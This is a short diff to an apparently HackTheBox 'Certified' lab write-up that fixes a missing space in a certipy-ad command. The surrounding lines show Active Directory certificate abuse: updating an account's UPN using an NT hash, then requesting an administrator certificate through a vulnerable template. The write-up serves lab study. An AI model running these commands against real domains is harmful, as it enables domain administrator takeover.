@@ -456,7 +456,7 @@ certipy-ad account update -u management_svc@certified.htb -hashes $NT_HASH -user
 
 Then request certificate of `administrator`
 ```bash
-certipy-ad req -u ca_operator@certified.htb -p $new_password -ca certified-DC01-CA -template CertifiedAuthentication -upn administrator -debug -dc-ip $target_ip-ns $target_ip
+certipy-ad req -u ca_operator@certified.htb -p $new_password -ca certified-DC01-CA -template CertifiedAuthentication -upn administrator -debug -dc-ip $target_ip -ns $target_ip
 ```
 
 After requestes `administrator.pfx` change the principal of `ca_operator` to original
